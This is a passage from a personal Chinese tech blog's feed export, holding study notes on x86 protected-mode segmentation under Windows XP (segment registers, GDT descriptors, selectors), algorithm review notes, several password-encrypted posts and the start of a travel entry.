  <script id="hbeData" type="hbeData" data-hmacdigest="ea03eb633da30af33661ed3fda7dfea989900812eee66978009b6d5993b00e57">65b591f270a691a8bcf50a13db064a0540d8370b2b178bef5f886620f7f46c8f1479db192f1a37193312baa07924a1c8369ca00346dac8d3ba8240fab5a29c8365580245010c267a7f112ef96f8a74054f687dde25ff5dff3a3ca268b5aea58f6761914266f86e35b2f17ce68f02f48a360916dd7e34ee83dcc27aac26b986bc81e83bf2819136263612f1e8407c73ebb0887e7656e63c713308fe81c3bbe37973c8e13cf921a23a26229bd0dbb42085a58f730c8844e901149e5b36417c1fa922ab96d12ad405e7aaf6666ab076c1960bd33368df942841650e24858151f32e0f1310e7a2110f6a68bade9674ceadd4d67b87f201bc6beb7c41052843d3340c0e2c30942ebf2d0b67e741fa5d02f071b1d1b775849815b8f37ce412920bd76152bd3fd2a2a4335920b310fd5dbfe05e1a85141ebd36646359e873338a5f06cf11024506e9e044977de8c8755776e603d14b37830f5ba952877de87ae79da41e83a8d56ea33412319eb0a741affa6bbaf1eddec434874eb526f7eb98617ad972413cab4c4ac1516605f13399cee2e09e19cf914c909aa0fa3e8c35a34e425a3e4634ba8692d897f36eb657b581eeb5b84388567baf768728f49a3abb20ba72ee26ec393a168ef008b5ed9d518cd9e16065642b58acc66ce6b58c6d55dc10fb78568e5db93cd2a15a95a124f01eac0d975a398b0f9a077c5f7efd5c9bf9e819ba367e9444156ee19789eae86394578a1edc6994185945ca301a1a4ab5fdcab16b6f52c3eaa8d06eab3cb79aebee4b95c6eaf0a8af84ba24486021cd76b8ace83e938d8fb631f48a15745cae4b8747389d6f68dbbf23a428afc4438b154e85b691306994c60ff63a688cf8403511bacd1d7eed0b7d1c92191151906a875d0900037c91e2320a7def1633f8fbb15105ae6cc83ca398d94a1ba8036cc1b65f0a80f7cddee83ab773fc0518ad8748c9b3a9cc1bfb4ea7b33a57a3b93a3ed274015dbc33f3ca2c0f7f9e8c2913623790e7f4b2fbf82192247e380fa014e31184c06af9c555e2d9047df82df8a48468d1add318c7e49f8c8a14463fa5a80ec4387bd9869b8e8c8a93f3724667fbed265b26fa1a127b72e64f5c8c249a49782534041df6745ab6f1226d37c329eff642dbebb287acb0866831558fbf4eb28d323bc892d59a183b4ac6ca51065d2a5d772dfdbb78cf67bd1e282e930cbdb1c8ef59c3d608037183e15432aa6b018f1a37ee2ef71b20b663c40602b9e05e237dffe7ad9fb48724b3125f6ba066809a60e0511f856987af0a39f04d1217d67675b6d896e8df90ffa31e07904acfbedb83c6714cc64b5a7de50405d786317847f0c0b3f96beb20a898d2e810aa9e0fa3e349eabd86bdb966c69038d17d602653dd09c31d3c1b815fdf7effca352f357b3c66f55a7dd27e78356ae9804c3bfdcc4956a4132cd148b4cfe756287a2f478b1114d32424134cdf42a72e653d4245345c5314621a77e613069511e0074a2ef11b5f974964c45e02672fd02744cc05a7500be6d111c4be4d21868f5bb2d2c190d596e904f2cbaf35f02ee8d27eda867e843df2b080d0e679164e8d7b17ef901d090db38c5e7e61ea430bc6d3d1afaece001288fa996797204d1ab75239b96627cc6efe0a891b6190513da15331ac6a57a225f93809da7d82e1ed7fe6d2409263b5cc902bbf7739ce8c393abf8e72fdb3ebf3e288ba8f331bc2ca44b77297fe920ebecc4f3814cda54a7a7a4e142867b4a8d27ef1f2b2284c6ff72a4890dea6ce9bbc6a180daec99ace9a34eb32b9e3e3d1216d8bf30c087f83028a51d00446207fcbcd6087533851f8b37b3a8f71ecfcaecf3f50739b407f1e4d2d6899cc8fcee240b3a14823b293348c8ce857702cb105a0152d2b7d7bc9822d3e9720a3fc8ae8a28ee40cbff01277af5f5b77c723af4bba0f3ea6b71702fabe260fe46b595d068bff7961b3e6ba97d579d466fd487b670ae0c7a5715fa8b5d5f1b2449ab76b428dcd73822ebff61db5eb66d9c612ebbb55df761f35d5c7fcf1c2a72309b4ded724151e40e910ccf7bd4fd89c8a1eee4b41231262ccd5d69bc582305a04b2f8589c3501a4741fec5893d2cc2083622c289e39073d90ad7d622e0f94b4cbbb7b5c009ed151f0faef710e868cac82693a7fb823a038d22dd3e573051ba5b612332e930c4a168e5b4e34a580db95790b690f4c75f395e29359c914d162bd2afee8bdfbf7b0c0bbc3b7264b7b506b1608b098a25880abd86809ecbd0ea0c8a12167c11cfacfed5bfc13a438c247b19f4c0f21ee75946554196aed4ca9ade52faaedc9f3a7cd625dc8438783a6ba7d295649349568def23281757e1b3edf3125260c6217f4a9bf8f20f90b9f0b4c8f3dd77b968786d6deb45d75c2eac6d5108295061dcbfd985f44e343303976c83091e5bc5ed40035387d73964807e4d81f9357660abe07b34d7efe049c39db26c43c5d30875507bc5a4fe573c2ab84931ebdb7d86886f070cd28b7e40c0173a15d58609b71cc182a2a49828aacbe777e9bb33b71c9d251cb5c079366f3a11ec57b843848e5dfb2f4b883cb69a0f2a46f078546f2f30e7ccddb256673c64c610bcfcd13c6b17c115006eb30846cbbb1029d7e3d69e6b2dfeecdf515f548e965c8c488c419f4f13ff648839c39697fbe8bd4410ca9bcbc613b66c72f3289a083db531680ed132d65d2d3065840764732c4608766b69a37a09ecdf1013755a53f342a0c4d6ff437ff4bfbf0e1e86521b4c3386a69f12331f40811d809465cb7d7db496bb490fe918523ad990bfb260aba77cb95e4256dec4dc40d5a339bb2d4e305f8f61ff25fcf0fadd04a58b59a22fea50ad9d96470f5d06e5855a782cc82ceffa9709a4b6e52585c2caf3f62d8f9dd9df0b64af5fee7cc741234bc83fbf8ad5019410c3be85d4d040e27de6c470a2cc30d7a930a7503db856c4c37dc1ed9fcae0eceb06c071393380a81ca6777bcda2f02ec2fdfe3c53f57e830ba2571a97620bab9e32bac79a8d1f2c2c0d09ee41fb14aaabd2a0ce405bf145aa72155395839f0137e71f8c25e15f22cd5d292c23a28088b0dc56a4f26d4d01e60827d71703d797cb0a388e76b02d7ed77b600a6d2365647a0673d4a500275328791de2be8709064a0eb4256e15b72fb91f7679538b27d25c9f098adb2e78320ad6d04b9dd69c7bad8d63c040ef24c8b6109ea547fe8fc6ecaca78f736c0e47c0a7594c43d92298d32a42b094f753bca732322f92c87695643f4172d9ee89ee582279c94cba26a833e836ac50b8127b0b3ac1f60835760c7ff19b7722875757480a9faa3128da06a87eefeb26b44d79e6c2d476a9bbea1b2bb03c525dffa53b137fc1202b61f26eea224a4162b514b58046198378da4a44907e501f59812c688d95da45a1101245fe5362c3a172c352b4234974b3cb3d00d81ce1b930d2374f31b985458c2c02c8c3bb714865759e517ab1455bf2799ec96a950e07f39d0cc6acb027d23a283b500f7de4d28a7520d22</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>序列密码</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 段保护（一）</title>
    <url>/post/WinXP-ProtectionMode-Segment/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-什么是保护模式"><a href="#1-什么是保护模式" class="headerlink" title="1 什么是保护模式"></a>1 什么是保护模式</h2><p>R3--SDK</p>
<p>R0--WDK</p>
<p>X86 CPU的3个工作模式：<strong>实模式</strong>、<strong>保护模式</strong>和<strong>虚拟8086模式</strong>。<br>现在的操作系统都是基于<strong>保护模式</strong>。<br>保护模式的两个重要机制：段的机制、页的机制。</p>
<div class="note warning"><p>保护模式：保护对内存的访问、保护某些指令的执行（特权指令 ）</p>
</div>

<p>段的机制非常复杂，了解段机制就要先了解<strong>段寄存器</strong>。</p>
<h2 id="2-段寄存器"><a href="#2-段寄存器" class="headerlink" title="2 段寄存器"></a>2 段寄存器</h2><p>段寄存器一共有八个：ES、CS、SS、DS、FS、GS、LDTR（Windows没有使用）、TR。</p>
<ul>
<li>每个段寄存器有<mark class="label danger">96位</mark>其中GS、LDTR这两寄存器Windows没有使用。</li>
<li>LDT表Windows也没有使用。</li>
<li>只有16位的可见部分：<code>Selecter</code>。</li>
</ul>
<h3 id="2-1-段寄存器的结构"><a href="#2-1-段寄存器的结构" class="headerlink" title="2.1 段寄存器的结构"></a>2.1 段寄存器的结构</h3><p><img data-src="https://s2.loli.net/2021/12/14/6R9qUTsupMkz827.png" alt="1.png"></p>
<p>可以通过结构体表示为如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SegMent</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    WORD Selecter;   <span class="comment">//16位的可见部分（段选择子）</span></span><br><span class="line">    WORD Atrributes; <span class="comment">//16位的属性（可读可写可执行）</span></span><br><span class="line">    DWORD Base;      <span class="comment">//32位的Base(当前段的起始地址)</span></span><br><span class="line">    DWORD Limit;     <span class="comment">//32位的Limit(当前段的长度)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>汇编读写一个地址：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov dword ptr ds:[<span class="number">0x00123456</span>],eax</span><br></pre></td></tr></table></figure>

<p>读写的地址实际上是<code>ds.Base+0x123456</code>。</p>
<div class="note warning"><p><strong>实际所有地址的读写都是这个结构</strong>：<code>XS.Base+Offset</code></p>
</div>



<h3 id="2-2-段寄存器的属性"><a href="#2-2-段寄存器的属性" class="headerlink" title="2.2 段寄存器的属性"></a>2.2 段寄存器的属性</h3><p><img data-src="https://s2.loli.net/2021/12/14/zI3QXb5RtSmMkZP.png" alt="2.png"></p>
<p><strong>段寄存器的读写：</strong></p>
<ul>
<li>mov ax,ds      &#x2F;&#x2F;只能读16位可见部分</li>
<li>mov ds,ax      &#x2F;&#x2F;写入是96位</li>
<li>可以通过MOV指令进行读写（LDTR和TR除外）</li>
<li>CS是可读、可执行、但不可写</li>
</ul>
<p><a href="https://blog.csdn.net/Kwansy/article/details/108738075">探测Base示例：</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> var = <span class="number">1</span>;					</span><br><span class="line">__asm					</span><br><span class="line">&#123;					</span><br><span class="line">	mov ax,fs				</span><br><span class="line">	mov gs,ax       <span class="comment">//等价于fs.base+0			</span></span><br><span class="line">	mov eax,gs:[<span class="number">0</span>]	<span class="comment">//不要用DS 否则编译不过去		</span></span><br><span class="line">	mov dword ptr ds:[var],eax	</span><br><span class="line">	<span class="comment">//mov edx,dword ptr ds:[0x7FFDF000]</span></span><br><span class="line">	<span class="comment">//常规来说，地址0x00是不允许读的，但是FS.Base!=0，所以这里可以编译并执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的GS就是FS。</p>
<h2 id="3-段描述符"><a href="#3-段描述符" class="headerlink" title="3 段描述符"></a>3 段描述符</h2><p>GDT表存的是段描述符，每个段描述符是64位（8字节）</p>
<p>这里涉及到两张表：GDT(全局描述符表)与 LDT(局部描述符表)。Windows用的是GDT表，LDT表几乎没用。</p>
<p>段描述符结构：（Intel手册卷3A）</p>
<p><img data-src="https://s2.loli.net/2021/12/14/e4MfhwDpIEPmLFl.png" alt="3.png"></p>
<div class="note warning"><p>段描述符表的位置、大小信息存在<mark class="label danger">GDTR位</mark>寄存器中，GDTR寄存器共6字节：</p>
<ul>
<li><p><strong>低2字节</strong>：段描述符表的<strong>大小</strong></p>
</li>
<li><p><strong>高4字节</strong>：段描述符表的<strong>起始地址</strong></p>
<p><img data-src="https://s2.loli.net/2021/12/14/6icvS7AetpMmVrC.png" alt="4.png"></p>
<p>L8：表示输出的组数为8。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/i18sCte3UGb6vyf.png" alt="53.png"></p>
</li>
</ul>
</div>

<h3 id="3-1-段描述符属性所在位置"><a href="#3-1-段描述符属性所在位置" class="headerlink" title="3.1 段描述符属性所在位置"></a>3.1 段描述符属性所在位置</h3><p><strong>Atrribute</strong>：高4字节中，8～23位</p>
<p> <strong>Base</strong>：</p>
<ul>
<li>高4字节中，24～31位，0～7位</li>
<li>低4字节中，16～31位</li>
</ul>
<p><strong>Limit</strong>：</p>
<ul>
<li>高4字节中，16～19位</li>
<li>低4字节中，0～15位</li>
</ul>
<p><img data-src="https://s2.loli.net/2021/12/15/voiAm8XzI35Buwj.png" alt="9.png"></p>
<h3 id="3-2-段描述查找练习"><a href="#3-2-段描述查找练习" class="headerlink" title="3.2 段描述查找练习"></a>3.2 段描述查找练习</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; r gdtr</span><br><span class="line">gdtr=<span class="number">8003f</span>000</span><br><span class="line">kd&gt; dq <span class="number">8003f</span>000</span><br><span class="line"><span class="number">8003f</span>000  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00</span>cf9b00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">8003f</span>010  <span class="number">00</span>cf9300`<span class="number">0000f</span>fff <span class="number">00</span>cffa00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">8003f</span>020  <span class="number">00</span>cff300`<span class="number">0000f</span>fff <span class="number">80008b</span>04`<span class="number">200020</span>ab</span><br><span class="line"><span class="number">8003f</span>030  ffc093df`f0000001 <span class="number">0040f</span>300`<span class="number">00000f</span>ff</span><br><span class="line"><span class="number">8003f</span>040  <span class="number">0000f</span>200`<span class="number">0400f</span>fff <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">8003f</span>050  <span class="number">80008955</span>`<span class="number">27000068</span> <span class="number">80008955</span>`<span class="number">27680068</span></span><br><span class="line"><span class="number">8003f</span>060  <span class="number">00009302</span>`<span class="number">2f</span>40ffff <span class="number">0000920b</span>`<span class="number">80003f</span>ff</span><br><span class="line"><span class="number">8003f</span>070  ff0092ff`<span class="number">700003f</span>f <span class="number">80009</span>a40`<span class="number">0000f</span>fff</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2021/12/15/S6cn71NYfpQdw2h.png" alt="10.png"></p>
<h2 id="4-段选择子"><a href="#4-段选择子" class="headerlink" title="4 段选择子"></a>4 段选择子</h2><p>段选择子是一个16位数，该数决定了取gdt表中查哪一个数据。这个值就是MOV DS,AX给的AX的值，从这个值中取赋值剩下的80位(96-16)。</p>
<p><img data-src="https://s2.loli.net/2021/12/14/hjy1X9lCY3OULfi.png" alt="5.png"></p>
<div class="note primary"><p>RPL共2位，<mark class="label info">值越小权限越大</mark>。值为0x00、0x11，对应于Windows使用的0环、3环。</p>
</div>

<p><img data-src="https://s2.loli.net/2021/12/15/HmBJCXDugr95czQ.png" alt="6.png"></p>
<p><strong>加载段描述符至段寄存器（其他几个汇编指令修改段寄存器）</strong></p>
<p>除了MOV指令，我们还可以使用LES、LSS、LDS、LFS、LGS指令修改寄存器。</p>
<p>CS不能通过上述的指令进行修改，CS为代码段，CS的改变会导致EIP的改变，要改CS，必须要保证CS与EIP一起改。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> buffer[<span class="number">6</span>];                    </span><br><span class="line">__asm                            </span><br><span class="line">&#123;            </span><br><span class="line">    les ecx,fword ptr ds:[buffer] <span class="comment">//高2个字节给es，低四个字节给ecx    </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<div class="note danger"><p><strong>注意</strong>：RPL&lt;&#x3D;DPL(在数值上)</p>
<p>RPL是段选择子的权限，DPL是段描述符的权限，数值越大权限越小。</p>
</div>



<h2 id="5-段描述符的P，G位"><a href="#5-段描述符的P，G位" class="headerlink" title="5 段描述符的P，G位"></a>5 段描述符的P，G位</h2><p><img data-src="https://s2.loli.net/2021/12/15/voiAm8XzI35Buwj.png" alt="9.png"></p>
<p><strong>P位</strong></p>
<ul>
<li>P &#x3D; 1 段描述符有效</li>
<li>P &#x3D; 0 段描述符无效</li>
</ul>
<p>通过指令将段描述符加载至段寄存器中，<strong>先检查P位，如果为0，那么该段描述符无效，其他检查都不做了</strong>。</p>
<p><strong>G位</strong></p>
<p>G位决定Limit的大小范围。D&#x2F;B位对数据段来说决定地址空间大小。</p>
<ul>
<li>当G&#x3D;0时，Limit的范围是0x00000000-0x<strong>000</strong>FFFFF，其中，段描述符的20位在低位，<mark class="label warning">高位补0</mark>。</li>
<li>当G&#x3D;1时，Limit的范围是0x00000FFF-0xFFFFF<strong>FFF</strong>，其中，段描述符的20位在高位，<mark class="label warning">低位补F</mark>。</li>
</ul>
<h2 id="6-段描述符的S、Type域"><a href="#6-段描述符的S、Type域" class="headerlink" title="6 段描述符的S、Type域"></a>6 段描述符的S、Type域</h2><p><img data-src="https://s2.loli.net/2021/12/15/voiAm8XzI35Buwj.png" alt="9.png"></p>
<div class="note success"><p>分析一个段描述符：</p>
<ol>
<li>先看P位</li>
<li>再看S位（S &#x3D; 1  代码段或者数据段描述符，S &#x3D; 0 系统段描述符)</li>
</ol>
</div>

<h3 id="6-1-S位"><a href="#6-1-S位" class="headerlink" title="6.1 S位"></a>6.1 S位</h3><ul>
<li><p>S&#x3D;1，表示代码段&#x2F;数据段；</p>
</li>
<li><p>S&#x3D;0，表示系统段。</p>
<p>S位决定着Type域的含义。</p>
</li>
</ul>
<p>DPL两种情况：00、11</p>
<p>也就是 00cf<strong>9</strong>300&#96;0000ffff 的十六进制高四字节第5个数只能为9或F才表示一个有效（P&#x3D;1）的段描述符CODE&#x2F;DATA</p>
<ul>
<li>S &#x3D; 1，CODE&#x2F;DATA<ul>
<li>0x1001：DPL &#x3D; 0x00</li>
<li>0x1111：DPL &#x3D; 0x11</li>
</ul>
</li>
<li>S &#x3D; 0，系统段描述符<ul>
<li>0x1000：DPL &#x3D; 0x00</li>
<li>0x1110：DPL &#x3D; 0x11</li>
</ul>
</li>
</ul>
<h3 id="6-2-Type域"><a href="#6-2-Type域" class="headerlink" title="6.2 Type域"></a>6.2 Type域</h3><p>TYPE域共4位，可以通过查表来确定其含义。（S&#x3D;1，CODE&#x2F;DTA、S&#x3D;0系统段描述符）</p>
<ul>
<li>当S &#x3D; 1时，段描述符表示CODE&#x2F;DATA。</li>
<li>当S &#x3D; 0时，段描述符是一个系统段描述符。</li>
</ul>
<div class="note success"><p><strong>S &#x3D; 1，Type&#x3D;0x1xxx，CODE代码段描述符</strong></p>
<p>CODE：</p>
<ul>
<li>A：段描述符是否被使用过<ul>
<li>1：使用过</li>
<li>0：未使用过</li>
</ul>
</li>
<li>R：是否可读<ul>
<li>1：可读</li>
<li>0：不可读</li>
</ul>
</li>
<li>C：一致位<ul>
<li>1：一致代码段</li>
<li>0：非一致代码段</li>
</ul>
</li>
</ul>
<p><strong>S &#x3D; 0，Type&#x3D;0x0xxx，DATA数据段描述符</strong></p>
<p>DATA：</p>
<ul>
<li><p>A：段描述符是否被使用过</p>
<ul>
<li>1：使用过</li>
<li>0：未使用过</li>
</ul>
</li>
<li><p>W：是否可写</p>
<ul>
<li>1：可写</li>
<li>0：不可写</li>
</ul>
</li>
<li><p>E：拓展位</p>
<ul>
<li><p>1：向下拓展，有效地址为右边红色（红色为64KB或4GB）</p>
</li>
<li><p>0：向上拓展，有效地址为左边红色（<strong>Windows使用</strong>，红色为64KB或4GB）</p>
<p><img data-src="https://s2.loli.net/2021/12/15/WGDYjrnBzgNEv74.png" alt="14.png"></p>
</li>
</ul>
</li>
</ul>
</div>

<p><img data-src="https://s2.loli.net/2022/01/29/p7igRC5t3NfzAFy.png" alt="13.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/29/niLUjlR5sg4Q6JD.png" alt="15.png"></p>
<h3 id="6-3-练习"><a href="#6-3-练习" class="headerlink" title="6.3 练习"></a>6.3 练习</h3><p>1、判断哪些是系统段描述符？哪些是代码或者数据段描述符？</p>
<p>2、判断哪些是代码段描述符？哪些是数据段描述符？</p>
<p>3、查分几个数据段：EWA</p>
<p>4、查分几个代码段：CRA</p>
<p>5、查分几个系统段描述符，分析属性</p>
<p>先看P位，再看S位。</p>
<p><img data-src="https://s2.loli.net/2021/12/15/G8WLm1bTtCSkVpX.png" alt="16.png"></p>
<h2 id="7-段描述符的D-x2F-B位"><a href="#7-段描述符的D-x2F-B位" class="headerlink" title="7 段描述符的D&#x2F;B位"></a>7 段描述符的D&#x2F;B位</h2><p><strong>D&#x2F;B位对数据段来说决定地址空间大小</strong>。</p>
<ol>
<li><p>情况一：<strong>对CS段的影响</strong>（加载：MOV CS, AX）  </p>
<p>D &#x3D; 1  采用32位寻址方式  </p>
<p>D &#x3D; 0  采用16位寻址方式 </p>
</li>
<li><p>情况二：<strong>对SS段的影响</strong>（加载：MOV SS, AX）  </p>
<p>D &#x3D; 1 隐式堆栈访问指令（如：PUSH POP CALL等会修改ESP） 使用32位堆栈指针寄存器ESP          </p>
<p>D &#x3D; 0 隐式堆栈访问指令（如：PUSH POP CALL等会修改SP） 使用16位堆栈指针寄存器SP  </p>
<p>指令前缀67：改变默认寻址方式，但不是改D&#x2F;B位，若默认是32寻址，则改为16位寻址。若默认是16寻址，则改为32位寻址。</p>
</li>
<li><p>情况三：<strong>对数据段DS、ES的影响</strong>（加载：MOV DS, AX）</p>
<p>D &#x3D; 1 段上限为4GB     0xFFFFFFFF  </p>
<p>D &#x3D; 0 段上限为64KB    0xFFFF </p>
<p><img data-src="https://s2.loli.net/2021/12/15/VHM7wEbe92Ooys1.png" alt="17.png"></p>
</li>
</ol>
<p><a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment/">Windows XP 段保护（一）</a></p>
<p><a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment2/">Windows XP 段保护（二）</a></p>
<p><a href="https://directoree.github.io/post/WinXP-ProtectionMode-Segment3/">Windows XP 段保护（三）</a></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>保护模式</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
      </tags>
  </entry>
  <entry>
    <title>Wireshark简单介绍和数据包分析</title>
    <url>/post/Wireshark-1/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="9aff91093715ab64d421d4fa481a55f3767bddf54339176be2ba7b3857c485ef"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Web-Tools</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title>XAMPP环境下配置DVWA</title>
    <url>/post/XAMPP-DVWA/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ff34d3422996979c87aa58cb5ae22bf768b464a7e9239776deb3e78855282803"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>XAMPP-DVWA</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>算法复习笔记</title>
    <url>/post/algorithm/</url>
    <content><![CDATA[<p>&amp;nbsp;<font face="楷体">11.19复习笔记</font></p>
<h3 id="二、递归与分治策略"><a href="#二、递归与分治策略" class="headerlink" title="二、递归与分治策略"></a><font face="楷体">二、递归与分治策略</font></h3><h4 id="1-递归与分治"><a href="#1-递归与分治" class="headerlink" title="(1)递归与分治"></a><font face="楷体">(1)递归与分治</font></h4><p><a href="https://s1.ax1x.com/2018/11/19/FpNSaQ.jpg"><img data-src="https://s1.ax1x.com/2018/11/19/FpNSaQ.jpg" alt="1"></a><br><a href="https://s1.ax1x.com/2018/11/19/FpNp5j.jpg"><img data-src="https://s1.ax1x.com/2018/11/19/FpNp5j.jpg" alt="2"></a></p>
<h4 id="2-二分搜索技术"><a href="#2-二分搜索技术" class="headerlink" title="(2)二分搜索技术"></a><font face="楷体">(2)二分搜索技术</font></h4><p><a href="https://s1.ax1x.com/2018/11/19/FpNCPs.jpg"><img data-src="https://s1.ax1x.com/2018/11/19/FpNCPs.jpg" alt="3"></a></p>
<h4 id="3-线性时间选择、最接近点对"><a href="#3-线性时间选择、最接近点对" class="headerlink" title="(3)线性时间选择、最接近点对"></a><font face="楷体">(3)线性时间选择、最接近点对</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2eBt.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV2eBt.jpg" alt="3"></a><br>&amp;nbsp;<br>&amp;nbsp;<br><font face="楷体">11.20复习笔记</font></p>
<h3 id="三、动态规划"><a href="#三、动态规划" class="headerlink" title="三、动态规划"></a><font face="楷体">三、动态规划</font></h3><h4 id="1-矩阵连乘"><a href="#1-矩阵连乘" class="headerlink" title="(1)矩阵连乘"></a><font face="楷体">(1)矩阵连乘</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV23cj.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV23cj.jpg" alt="4"></a></p>
<h4 id="2-最长公共子序列"><a href="#2-最长公共子序列" class="headerlink" title="(2)最长公共子序列"></a><font face="楷体">(2)最长公共子序列</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2UEV.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV2UEV.jpg" alt="5"></a></p>
<h4 id="3-最长子段和、凸多边形、图像压缩"><a href="#3-最长子段和、凸多边形、图像压缩" class="headerlink" title="(3)最长子段和、凸多边形、图像压缩"></a><font face="楷体">(3)最长子段和、凸多边形、图像压缩</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2B34.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV2B34.jpg" alt="6"></a></p>
<h4 id="4-电路布线"><a href="#4-电路布线" class="headerlink" title="(4)电路布线"></a><font face="楷体">(4)电路布线</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2yuR.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV2yuR.jpg" alt="7"></a></p>
<h4 id="5-流水作业调度、0-1背包"><a href="#5-流水作业调度、0-1背包" class="headerlink" title="(5)流水作业调度、0-1背包"></a><font face="楷体">(5)流水作业调度、0-1背包</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV22E6.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV22E6.jpg" alt="8"></a><br>&amp;nbsp;<br>&amp;nbsp;<br><font face="楷体">11.21复习笔记</font></p>
<h3 id="四、贪心算法"><a href="#四、贪心算法" class="headerlink" title="四、贪心算法"></a><font face="楷体">四、贪心算法</font></h3><h4 id="1-活动安排、背包问题"><a href="#1-活动安排、背包问题" class="headerlink" title="(1)活动安排、背包问题"></a><font face="楷体">(1)活动安排、背包问题</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV25gH.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV25gH.jpg" alt="9"></a></p>
<h4 id="2-最优装载、哈夫曼编码、单源最短路径"><a href="#2-最优装载、哈夫曼编码、单源最短路径" class="headerlink" title="(2)最优装载、哈夫曼编码、单源最短路径"></a><font face="楷体">(2)最优装载、哈夫曼编码、单源最短路径</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2LUf.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV2LUf.jpg" alt="10"></a></p>
<h4 id="3-最小生成树"><a href="#3-最小生成树" class="headerlink" title="(3)最小生成树"></a><font face="楷体">(3)最小生成树</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2jPS.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FV2jPS.jpg" alt="11"></a></p>
<h4 id="4-多机调度问题"><a href="#4-多机调度问题" class="headerlink" title="(4)多机调度问题"></a><font face="楷体">(4)多机调度问题</font></h4><p><a href="https://s1.ax1x.com/2018/11/28/FVRurR.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FVRurR.jpg" alt="12"></a></p>
<h3 id="五、回溯法"><a href="#五、回溯法" class="headerlink" title="五、回溯法"></a><font face="楷体">五、回溯法</font></h3><p><a href="https://s1.ax1x.com/2018/11/28/FVR1IK.jpg"><img data-src="https://s1.ax1x.com/2018/11/28/FVR1IK.jpg" alt="13"></a></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
      </tags>
  </entry>
  <entry>
    <title>台儿庄古镇</title>
    <url>/post/ancientcityoftaierzhaung/</url>
    <content><![CDATA[<p>*ˊᵕˋ)੭</p>
<span id="more"></span>
<p>2019&#x2F;4&#x2F;5和小伙伴们去“天下第一庄”的台儿庄古城耍去了。</p>
<ul>
